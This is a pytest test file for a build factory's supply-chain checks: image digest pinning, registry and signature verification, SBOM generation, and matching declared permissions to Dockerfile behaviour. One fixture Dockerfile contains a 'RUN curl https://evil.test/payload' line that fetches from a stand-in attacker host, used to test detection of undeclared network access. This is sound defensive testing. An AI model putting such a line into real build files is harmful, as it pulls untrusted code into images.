"""S2: :latest fails, unverifiable tags fail, SBOM, F21, performed pin check."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.factory.blueprint import load_blueprint
from app.factory.build.data_lifecycle import render_entrypoint
from app.factory.build.network_posture import declaration
from app.factory.build.preflight import write_evidence
from app.factory.build.roles import _coder_route_body, _render_dockerfile
from app.factory.build.runner import RoleRunner
from app.factory.build.supply_chain import (
    EMITTER_ID,
    PERMISSIONS_REL,
    PYTHON_312_SLIM_DIGEST,
    PYTHON_312_SLIM_FROM,
    SBOM_REL,
    SupplyChainError,
    assert_generated_dockerfile,
    assert_known_block_ids,
    assert_permissions_match,
    assert_sbom,
    build_cyclonedx_sbom,
    canonical_fingerprint,
    evaluate_supply_chain,
    fetch_registry_manifest_digest,
    findings_for_image_ref,
    fingerprint_disagreements,
    known_factory_block_ids,
    from_refs,
    observe_behaviour,
    p1_declared_permissions,
    perform_local_pin_check,
    perform_pin_verification,
    perform_signature_verification,
    redact_unpinned_images,
    render_cyclonedx_sbom,
    reread_matches,
    scan_dockerfile,
    write_reread_twin,
)

ROOT = Path(__file__).resolve().parents[3]
SMOKE = ROOT / "blueprints/examples/runner_smoke.yaml"


@pytest.fixture(autouse=True)
def _no_paid_calls(monkeypatch):
    monkeypatch.setenv("FACTORY_CODER_ENABLED", "0")


def test_latest_is_not_a_pin():
    findings = findings_for_image_ref("ghcr.io/cerebrum-blocks/capture:latest", loc="x")
    assert findings and ":latest" in findings[0]


def test_unpinned_tag_is_not_a_pin():
    findings = findings_for_image_ref("python:3.12-slim", loc="Dockerfile")
    assert findings and "not digest-pinned" in findings[0]


def test_hub_digest_is_accepted():
    assert findings_for_image_ref(PYTHON_312_SLIM_FROM, loc="Dockerfile") == []


def test_generated_dockerfile_rejects_latest():
    with pytest.raises(SupplyChainError, match=":latest"):
        assert_generated_dockerfile("FROM python:latest\n")


def test_generated_dockerfile_rejects_floating_tag():
    with pytest.raises(SupplyChainError, match="not digest-pinned"):
        assert_generated_dockerfile("FROM python:3.12-slim\n")


def test_role_runner_dockerfile_is_digest_pinned():
    text = _render_dockerfile()
    assert PYTHON_312_SLIM_FROM in text
    assert ":latest" not in text
    assert scan_dockerfile(text) == []


def test_unknown_block_id_is_refused():
    with pytest.raises(SupplyChainError, match="do not invent"):
        assert_known_block_ids(["analytics", "not_a_real_block_zzz"])


def test_vendor_mirror_ids_are_known():
    known = known_factory_block_ids()
    assert "analytics" in known
    assert "dashboard" in known
    assert "chat" not in known, "do not invent chat; it is upstream in Cerebrum-Blocks"


def test_redact_unpinned_block_image(tmp_path: Path):
    path = tmp_path / "block.json"
    path.write_text(
        '{"id": "capture", "execution": {"image": "ghcr.io/cerebrum-blocks/capture:latest"}}\n',
        encoding="utf-8",
    )
    assert redact_unpinned_images(path)
    text = path.read_text(encoding="utf-8")
    assert ":latest" not in text
    assert "refused_unverified" in text


def test_local_pin_check_is_performed_not_configured_only():
    ok = perform_local_pin_check(PYTHON_312_SLIM_FROM)
    assert ok["performed"] is True
    assert ok["ok"] is True
    assert ok["digest"] == PYTHON_312_SLIM_DIGEST
    other = perform_local_pin_check(
        "python:3.12-slim@sha256:" + ("a" * 64)
    )
    assert other["performed"] is True
    assert other["ok"] is False
    floating = perform_local_pin_check("python:3.12-slim")
    assert floating["performed"] is True
    assert floating["ok"] is False


def test_registry_manifest_confirms_recorded_digest():
    result = fetch_registry_manifest_digest(PYTHON_312_SLIM_DIGEST)
    if not result["ok"]:
        pytest.skip(reason=result.get("reason") or "registry unreachable")
    assert result["performed"] is True
    assert result["registry_digest"] == PYTHON_312_SLIM_DIGEST


def test_registry_rejects_invented_digest():
    fake = "sha256:" + ("0" * 64)
    result = fetch_registry_manifest_digest(fake)
    if "failed" in str(result.get("reason") or "") and "HTTPError" not in str(
        result.get("reason") or ""
    ):
        # Network down: cannot prove refusal. Skip rather than pass.
        pytest.skip(reason=result.get("reason") or "registry unreachable")
    assert result["performed"] is True
    assert result["ok"] is False


def test_signature_is_not_claimed_when_cosign_cannot_verify():
    result = perform_signature_verification(PYTHON_312_SLIM_FROM)
    assert result["claimed"] is False
    assert result["ok"] is False
    assert result["performed"] is False
    assert "cosign" in str(result.get("reason") or "").lower()


def test_sbom_is_cyclonedx_and_names_recorded_digest():
    doc = build_cyclonedx_sbom(
        product_id="runner-smoke",
        product_name="Role Runner Smoke Product",
        image_ref=PYTHON_312_SLIM_FROM,
        requirements_text="fastapi>=0.110\n",
        blocks=("analytics",),
    )
    assert_sbom(doc)
    assert doc["bomFormat"] == "CycloneDX"
    blob = json.dumps(doc)
    assert PYTHON_312_SLIM_DIGEST.split(":", 1)[-1] in blob
    assert ":latest" not in blob
    names = {item["name"] for item in doc["components"]}
    assert "python" in names
    assert "fastapi" in names
    assert "analytics" in names


def test_sbom_refuses_latest_and_floating_tags():
    with pytest.raises(SupplyChainError, match=":latest"):
        build_cyclonedx_sbom(
            product_id="x", product_name="x", image_ref="python:latest"
        )
    with pytest.raises(SupplyChainError, match="not digest-pinned"):
        build_cyclonedx_sbom(
            product_id="x", product_name="x", image_ref="python:3.12-slim"
        )


def test_sbom_render_is_deterministic():
    kwargs = dict(
        product_id="runner-smoke",
        product_name="Role Runner Smoke Product",
        image_ref=PYTHON_312_SLIM_FROM,
        requirements_text="fastapi>=0.110\n",
        blocks=("dashboard", "analytics"),
    )
    assert render_cyclonedx_sbom(**kwargs) == render_cyclonedx_sbom(**kwargs)


def test_f21_match_on_role_runner_emission():
    docker = _render_dockerfile()
    entry = render_entrypoint()
    posture = declaration()
    result = assert_permissions_match(
        p1_declared_permissions(), docker, entry, posture
    )
    assert result["ok"] is True
    observed = observe_behaviour(docker, entry, posture)
    assert observed == {"network": False, "filesystem": True, "install": True}


def test_dockerfile_is_read_by_its_grammar_not_by_words():
    """FROM / RUN / ENV are instructions, not substrings: a comment naming them
    decides nothing, continuations join, --platform is not the image, and a
    data path is one an ENV configures and a RUN materialises -- whatever the
    variable or the tool is called."""
    docker = (
        "# FROM evil:latest  and  RUN pip install  in a comment\n"
        f"from --platform=linux/amd64 {PYTHON_312_SLIM_FROM}\n"
        "ENV ZORBLAT_HOME=/srv/zorblat\n"
        "RUN zorbctl prepare \\\n    /srv/zorblat\n"
    )
    assert from_refs(docker) == [PYTHON_312_SLIM_FROM]
    assert scan_dockerfile(docker) == []
    observed = observe_behaviour(docker, "", {"posture": "P1"})
    assert observed["install"] is True and observed["filesystem"] is True
    bare = f"FROM {PYTHON_312_SLIM_FROM}\n# RUN mkdir -p /app/data STORAGE_PATH\n"
    observed = observe_behaviour(bare, "alembic upgrade head", {"posture": "P1"})
    assert observed["install"] is False and observed["filesystem"] is False


def test_f21_mismatch_outbound_dockerfile():
    docker = (
        f"FROM {PYTHON_312_SLIM_FROM}\n"
        "RUN curl https://evil.test/payload\n"
        "ENV STORAGE_PATH=/app/data\n"
        "RUN mkdir -p /app/data\n"
        "RUN pip install --no-cache-dir -r requirements.txt\n"
    )
    entry = "#!/bin/sh\nexec uvicorn app.main:app --host 0.0.0.0 --port 8000\n"
    with pytest.raises(SupplyChainError, match="network"):
        assert_permissions_match(
            p1_declared_permissions(), docker, entry, {"posture": "P1"}
        )


def test_f21_mismatch_declared_install_false():
    docker = _render_dockerfile()
    entry = render_entrypoint()
    declared = dict(p1_declared_permissions())
    declared["install"] = False
    with pytest.raises(SupplyChainError, match="install"):
        assert_permissions_match(declared, docker, entry, declaration())


def test_f21_mismatch_block_network_false_vs_outbound():
    docker = (
        f"FROM {PYTHON_312_SLIM_FROM}\n"
        "RUN curl https://cloud.example/llm\n"
        "ENV STORAGE_PATH=/app/data\n"
        "RUN mkdir -p /app/data\n"
        "RUN pip install --no-cache-dir -r requirements.txt\n"
    )
    entry = "#!/bin/sh\nalembic upgrade head\n"
    blocks = [{"id": "capture", "permissions": {"network": False}}]
    with pytest.raises(SupplyChainError, match="capture"):
        assert_permissions_match(
            p1_declared_permissions(),
            docker,
            entry,
            {"posture": "P1"},
            blocks=blocks,
        )


def test_role_runner_emits_sbom(tmp_path: Path, stub_coder):
    out = tmp_path / "build"
    outcome = RoleRunner(load_blueprint(SMOKE), out).run()
    assert outcome.ok, outcome.to_dict()
    sbom_path = out / SBOM_REL
    assert sbom_path.is_file()
    doc = json.loads(sbom_path.read_text(encoding="utf-8"))
    assert_sbom(doc)
    blob = sbom_path.read_text(encoding="utf-8")
    assert ":latest" not in blob
    assert PYTHON_312_SLIM_DIGEST.split(":", 1)[-1] in blob
    perms = json.loads((out / PERMISSIONS_REL).read_text(encoding="utf-8"))
    assert perms["network"] is False
    assert perms["filesystem"] is True
    assert perms["install"] is True
    docker = (out / "Dockerfile").read_text(encoding="utf-8")
    assert PYTHON_312_SLIM_FROM in docker
    assert scan_dockerfile(docker) == []


def test_coder_route_body_stays_none_on_s2_path():
    assert _coder_route_body(None, None, None) is None
    from app.factory.build import pilot as pilot_mod
    from app.factory.build import runner as runner_mod

    assert not hasattr(pilot_mod, "prepare_pilot_workspace")
    assert "prepare_pilot_workspace" not in Path(runner_mod.__file__).read_text(
        encoding="utf-8"
    )


def test_evaluate_supply_chain_and_reread(tmp_path: Path):
    result = evaluate_supply_chain(live_registry=True)
    assert result["stage"] == "S2"
    assert result["emitter"] == EMITTER_ID
    assert result["PILOT_READY"] is False
    assert result["pass_criteria"]["coder_route_body_is_None"] is True
    assert result["pass_criteria"]["latest_fails"] is True
    assert result["pass_criteria"]["floating_tag_fails"] is True
    assert result["pass_criteria"]["sbom_emitted"] is True
    assert result["pass_criteria"]["f21_permissions_match_behaviour"] is True
    assert result["signature"]["claimed"] is False
    assert result["checks_performed"]["local_digest_vs_recorded"] is True
    assert result["checks_configured"]["PYTHON_312_SLIM_DIGEST"] is True
    if not result["ok"]:
        # Fail closed: do not paper over an unverifiable pin.
        assert result["verdict"] == "FAIL"
        assert result["first_failing_criterion"]
    else:
        assert result["verdict"] == "PASS"
        assert result["pin_verification"]["ok"] is True
        assert result["pin_verification"]["registry"]["performed"] is True
    dest = tmp_path / "S2_supply_chain.json"
    write_evidence(dest, result)
    twin_path = write_reread_twin(dest, result, live_registry=True)
    written = json.loads(dest.read_text(encoding="utf-8"))
    twin = json.loads(twin_path.read_text(encoding="utf-8"))
    if result["ok"]:
        assert twin["disagreements"] == []
        assert reread_matches(written, twin) is True
    assert canonical_fingerprint(result) == canonical_fingerprint(
        evaluate_supply_chain(live_registry=True)
    )
    other = evaluate_supply_chain(live_registry=True)
    other["git_sha"] = "0" * 40
    assert "git_sha" in fingerprint_disagreements(result, other)


def test_pin_verification_without_registry_still_parses_emitted_from():
    pin = perform_pin_verification(PYTHON_312_SLIM_FROM, live_registry=False)
    assert pin["performed"] is True
    assert pin["local"]["ok"] is True
    assert pin["registry"]["performed"] is False
    assert pin["ok"] is True
    bad = perform_pin_verification("python:3.12-slim", live_registry=False)
    assert bad["ok"] is False
    assert bad["local"]["performed"] is True
